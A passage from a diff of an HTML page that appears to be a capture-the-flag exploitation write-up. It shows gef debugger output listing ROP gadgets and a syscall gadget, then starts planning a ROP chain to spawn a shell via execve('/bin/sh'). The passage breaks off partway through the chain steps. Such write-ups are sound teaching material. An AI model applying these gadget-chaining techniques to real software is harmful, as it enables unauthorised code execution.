+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>// Lot of useful gadgets found in 7th address region
+</span></span><span style="display:flex;"><span>gef➤  x/25i 0x00000f0b001000
+</span></span><span style="display:flex;"><span>   0xf0b001000:	push   rdi
+</span></span><span style="display:flex;"><span>   0xf0b001001:	pop    rdi
+</span></span><span style="display:flex;"><span>   0xf0b001002:	ret    
+</span></span><span style="display:flex;"><span>   0xf0b001003:	push   rdi
+</span></span><span style="display:flex;"><span>   0xf0b001004:	pop    rsi
+</span></span><span style="display:flex;"><span>   0xf0b001005:	ret    
+</span></span><span style="display:flex;"><span>   0xf0b001006:	push   rdi
+</span></span><span style="display:flex;"><span>   0xf0b001007:	pop    rax
+</span></span><span style="display:flex;"><span>   0xf0b001008:	ret
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// Syscall found in 2nd address region
+</span></span><span style="display:flex;"><span>gef➤  x/10i 0x0000f900001000
+</span></span><span style="display:flex;"><span>   0xf900001000:	mov    eax,edi
+</span></span><span style="display:flex;"><span>   0xf900001002:	syscall 
+</span></span><span style="display:flex;"><span>   0xf900001004:	ret
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We plan to use these gadgets to do syscall <code>execve('/bin/sh')</code>. The rough plan is to build a ROP chain to do this:</p>
 <ul>
 <li>pop &ldquo;/bin/sh\x00&rdquo; pointer to <code>rdi</code></li>
 <li>pop null to <code>rsi</code></li>
